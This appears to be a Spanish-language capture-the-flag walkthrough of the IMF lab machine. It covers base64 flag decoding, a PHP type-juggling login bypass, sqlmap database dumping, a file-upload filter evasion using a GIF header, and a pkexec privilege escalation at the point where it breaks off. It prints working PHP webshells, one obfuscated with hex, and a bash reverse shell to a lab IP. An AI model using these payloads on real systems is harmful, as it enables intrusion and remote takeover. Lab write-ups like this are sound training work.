PORT   STATE SERVICE
80/tcp open  http

-Añadimos imf.local al /etc/hosts

-Miramos el Código Fuente con CTRL + U y vemos unas cadenas extrañas en unos enlaces js:
	<script src="js/ZmxhZzJ7YVcxbVl.js"></script>
	<script src="js/XUnRhVzVwYzNS.js"></script>
    <script src="js/eVlYUnZjZz09fQ==.min.js"></script>

-Parece ser Base64, los decodificamos juntando las cadenas de los 3:
	-echo 'ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==' | base64 -d 
		flag2{aW1mYWRtaW5pc3RyYXRvcg==} 

-Decodificamos la Cadena de la Flag:
	-echo 'aW1mYWRtaW5pc3RyYXRvcg==' | base64 -d
		infadministrator

-Nos vamos a -http://imf.local/infadministrator/, es un Panel de Login, en el Código Fuente encontramos el siguiente comentario:
	'<!-- I couldn't get the SQL working, so I hard-coded the password. It's still mad secure through. - Roger -->'

-Parece que el Login no está aplicando SQL por detrás, sino que se está empleando una comparativa en PHP:
	-Algo así:
		if ($_POST['pass'] == $hardcoded_password)

-El **Punto Crítico** es que se está usando == (**Comparación débil**, Intenta convertir tipos) en lugar de === (**Comparación estricta** , verifica tipo y valor):
	-Si le pasamos un Array:
		$_POST['pass'] = array('test');

-**PHP no puede convertir array a string** automáticamente. En algunos entornos esto puede:
	-**Dejarte pasar** si el bloque 'if' falla pero el código no maneja correctamente el caso.

-Para saltarnos la comparativa en PHP:
	-user=rmichaels&pass[]=test
		-FUNCIONA!!, Nos hemos saltado el Login!

-LLegamos a la siguiente URL:
	-http://imf.local/imfadministrator/cms.php?pagename=home

-Probamos 'Local File Inclusion' , SIN ÉXITO

## SQL Injection (SQLI) 

### SQLMAP

-Listamos las **Bases de Datos existentes**:
	-sqlmap -u "http://imf.local/imfadministrator/cms.php?pagename=home" --cookie "PHPSESSID=normfvh3h4h7fujqb63g0lfbj4" --dbs --batch 
		[*] admin
		[*] information_schema
		[*] mysql
		[*] performance_schema
		[*] sys

-Dumpeamos toda la BD 'admin':
	-sqlmap -u "http://imf.local/imfadministrator/cms.php?pagename=home" --cookie "PHPSESSID=normfvh3h4h7fujqb63g0lfbj4" -D admin --dump --batch
		-Importante: Encontramos el siguiente EndPoint:
			-/tutorials-incomplete

-------------------------------------------------------------------

-Buscamos el EndPoint en la URL:
	-http://imf.local/imfadministrator/cms.php?pagename=tutorials-incomplete

-Nos aparece un Código QR, el cual escaneamos con el móvil y encontramos la flag4:
	-flag4{dXBsb2Fkcjk0Mi5waHA=}

-Lo decodificamos:
	-echo 'dXBsb2Fkcjk0Mi5waHA=' | base64 -d    
		uploadr942.php

-Nos vamos a la siguiente URL y encontramos un 'Formulario Inteligente de subida de archivos', parece ser que está aplicando algún tipo de filtro:
	-http://imf.local/imfadministrator/uploadr942.php

-No nos deja subir ningún tipo de archivo con extensión PHP o parecida

-Si subimos un archivo .jpeg con el contenido de una webshell el WAF nos detecta:
	-'Error: **CrappyWAF detected malware**. Signature: system php function detected'

## Para ver que extensiones podemos subir

-Creamos un archivo con extensión jpg (por ejemplo) , y de contenido una webshell, seleccionamos el archivo y al darle a **'submit'**, Interceptamos la Petición con **BurpSuite**

-Después mandamos la Petición al **Intruder**. Veremos **'filename=webshell.jpg'**, seleccionamos el **'jpg'** y le damos a 'Add'. En la **Parte Derecha** hay **3 Pestañas**: **Payloads**, **Resource Pool** y **Settings**. 

-Seleccionamos **'Payloads'** y vamos añadiendo las extensiones que queremos probar, Ej;
	-php,php3,php4,php5,php7,pht,phtml,jpg,png,gif,jpeg

-Después, seleccionamos **'Settings'** y en el apartado **'Grep-Extract'** seleccionamos **'Add'**, dentro le damos a **'Refetch Response'** y Seleccionamos la Frase que nos dice que el archivo es inválido y le damos a **'ok'**, en este caso:
	-Error: Invalid file type.
	(Esto es una expresión regular, que al hacer el Ataque nos saldrá si el archivo no está permitido, y si lo está nos saldrá otra cosa)

-Antes de empezar el ataque, cambiamos el Content-Type a:
	-Content-Type: image/jpg

-Una vez añadidas las Extensiones en **'Payloads'** y la Expresión Regular en **'Settings'**, le damos a **'Start Attack'**

-Las extensiones válidas en este caso son:
	-jpg,jpeg,png y gif

## File Upload - Waf Bypass

-Tenemos que subir un archivo con una extensión válida y con un contenido válido y que nos sirva para obtener un RCE

-**Gif** es una **extensión válida** en este caso. Dentro podemos poner un código PHP que no use la función **'system'** ni **'exec'** ya que están bloqueadas. 

-También debemos poner el texto **'GIF8;'** al principio del archivo para que lo detecte como un archivo .GIF y no como un .PHP. Podemos comprobar que funciona con el siguiente comando:
	-file webshell.gif
		webshell.gif: GIF image data 16188 x 26736

-NOTA: Si el archivo no tuviese el texto 'GIF8;' al principio, lo detectaría como un archivo '.php' aunque tuviera la extensión '.gif'

-El contenido de nuestro archivo que hace Bypass del WAF es:
	GIF8;
	<?php
	        $c=$_GET['cmd'];
	        echo `$c`;
	?>

-NOTA: Hay otra forma de Bypassear el WAF, convirtiendo la palabra 'system' a Hexadecimal:
	GIF8;
	<?php
		"\x73\x79\x73\x74\x65\x6d"($_GET['cmd']);
	?>

-Lo subimos desde el BurpSuite y:
	-File successfully uploaded.
		<!-- 5348182e72c0 -->

-Nos vamos a la siguiente ruta y Ejecutamos Comandos a través de la webshell:
	-http://imf.local/imfadministrator/uploads/e45392136fff.gif?cmd=id
		**GIF8; uid=33(www-data) gid=33(www-data) groups=33(www-data)** 

-Nos mandamos una RS:
	-imf.local/imfadministrator/uploads/e45392136fff.gif?cmd=bash -c 'bash -i >%26 /dev/tcp/192.168.236.128/1234 0>%261'
		**www-data@imf:/$ whoami**
			**www-data**

## Escalada de Privilegios

-Tenemos el binario /usr/bin/pkexec con permisos SUID, abusamos de el






